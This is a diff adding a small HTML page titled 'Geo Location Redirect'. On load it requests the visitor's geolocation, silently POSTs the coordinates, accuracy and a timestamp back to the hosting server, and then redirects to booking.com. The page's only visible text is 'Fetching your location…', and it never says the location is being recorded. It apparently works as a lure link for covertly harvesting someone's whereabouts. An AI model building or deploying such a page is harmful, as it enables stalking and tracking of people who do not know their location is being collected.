@@ -1,0 +1,34 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Geo Location Redirect</title>
+  <script>
+    window.onload = function () {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function (position) {
+          // Send location data (optional step, can be removed if not needed)
+          fetch('/', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json'},
+            body: JSON.stringify({
+              latitude: position.coords.latitude,
+              longitude: position.coords.longitude,
+              accuracy: position.coords.accuracy,
+              timestamp: Date.now()
+})
+});
+
+          // Redirect to booking.com after acquiring location
+          window.location.href = "https://www.booking.com";
+});
+}
+};
+  </script>
+</head>
+<body>
+  <h1>Fetching your location…</h1>
+</body>
+</html>
